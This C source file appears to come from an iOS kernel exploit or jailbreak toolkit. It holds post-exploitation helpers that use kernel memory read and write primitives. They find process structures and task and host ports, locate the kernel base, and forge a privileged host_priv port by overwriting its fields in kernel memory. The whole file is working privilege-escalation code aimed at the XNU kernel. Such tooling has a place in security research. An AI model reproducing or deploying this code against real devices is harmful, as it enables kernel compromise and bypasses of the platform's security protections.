#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>

#include "kutils.h"
#include "kmem.h"
#include "offsets.h"
#include "find_port.h"
#include "patchfinder64.h"

extern offsets_t offset_struct;

uint64_t proc_of_pid(pid_t pid) {
    uint64_t proc = rk64(offset_struct.allproc), pd;
    while (proc) {
        pd = rk32(proc + 0x10);
        if (pd == pid) return proc;
        proc = rk64(proc);
    }
    
    return 0;
}

unsigned int pid_of_procName(char *nm) {
    uint64_t proc = rk64(offset_struct.allproc);
    char name[40] = {0};
    while (proc) {
        rkbuffer(proc + 0x268, name, 40);
        if (strstr(name, nm)) return rk32(proc + 0x10);
        proc = rk64(proc);
    }
    return 0;
}

uint64_t the_realhost;

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
      if (kCFCoreFoundationVersionNumber >= 1450.14) {
          uint64_t selfproc = proc_of_pid(getpid());
          if (selfproc == 0) {
              fprintf(stderr, "[-] failed to find our task addr\n");
              return -1;
          }
          uint64_t addr = rk64(selfproc + 0x18);
          
          uint64_t task_addr = addr;
          uint64_t itk_space = rk64(task_addr + 0x308);
          
          uint64_t is_table = rk64(itk_space + 0x20);
          
          uint32_t port_index = mach_task_self() >> 8;
          const int sizeof_ipc_entry_t = 0x18;
          
          uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
          
          cached_task_self_addr = port_addr;
      }
      else {
          cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
      }
      printf("task self: 0x%llx\n", cached_task_self_addr);
  }
  return cached_task_self_addr;
}

uint64_t ipc_space_kernel() {
  return rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t current_thread() {
  uint64_t thread_port = (kCFCoreFoundationVersionNumber >= 1450.14) ? find_port_via_kmem_read(mach_thread_self()) : find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
  return rk64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}

uint64_t find_kernel_base() {
  uint64_t hostport_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? find_port_via_kmem_read(mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  the_realhost = realhost;
  
  uint64_t base = realhost & ~0xfffULL;
  // walk down to find the magic:
  for (int i = 0; i < 0x10000; i++) {
    if (rk32(base) == 0xfeedfacf) {
      return base;
    }
    base -= 0x1000;
  }
  return 0;
}
mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
  if (fake_host_priv_port != MACH_PORT_NULL) {
    return fake_host_priv_port;
  }
  // get the address of realhost:
  uint64_t hostport_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? find_port_via_kmem_read(mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  // allocate a port
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate port\n");
    return MACH_PORT_NULL;
  }
  
  // get a send right
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // locate the port
  uint64_t port_addr = (kCFCoreFoundationVersionNumber >= 1450.14) ? find_port_via_kmem_read(port) : find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
  
  // change the space of the port
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
  
  // set the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
  
  fake_host_priv_port = port;
  
  return port;
}

